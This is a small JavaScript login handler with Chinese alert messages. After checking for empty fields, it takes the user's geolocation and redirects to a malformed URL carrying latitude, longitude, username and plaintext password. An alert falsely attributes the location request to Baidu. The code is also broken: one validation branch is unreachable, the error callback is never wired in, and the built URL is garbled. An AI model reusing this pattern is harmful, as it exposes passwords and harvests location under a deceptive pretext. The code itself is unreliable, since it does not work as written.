function logon(){
    var password = document.getElementById("pwd").value;
    var usersname = document.getElementById("usersname").value;
    if(password == ""){
        alert("密码不可为空")
        return false
    }
    if (usersname == "") {
        alert("用户名不可为空")
        return false
    }
    if (usersname == "" && password == "") {
        alert("用户名和密码不可为空")
        return false
    }
    else {
        window.navigator.geolocation.getCurrentPosition(function (position) {
            console.log(position.coords.latitude)
            console.log(position.coords.longitude)
            var x = position.coords.latitude;
            var y = position.coords.longitude;
            info="'"+"latitude="+x+";"+"longitude="+y+"usesname="+usersname+"password="+password
            window.location.href=info
        })   
        error =>{
            alert("百度必须访问您的地址才能为您提供服务")
        }
    }
}
function onload() {

}